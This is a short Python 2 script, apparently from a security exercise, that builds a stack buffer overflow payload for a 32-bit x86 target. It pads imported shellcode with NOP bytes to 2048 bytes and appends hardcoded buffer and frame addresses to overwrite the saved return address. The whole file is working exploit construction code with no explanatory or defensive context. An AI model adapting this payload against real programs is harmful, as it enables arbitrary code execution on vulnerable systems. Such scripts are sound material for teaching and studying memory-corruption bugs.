from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf = 0xbffeec58
padding = (2048 - len(shellcode))

print shellcode + '\x90' * padding + pack("<I", buf) + pack("<I", ebp + 4)
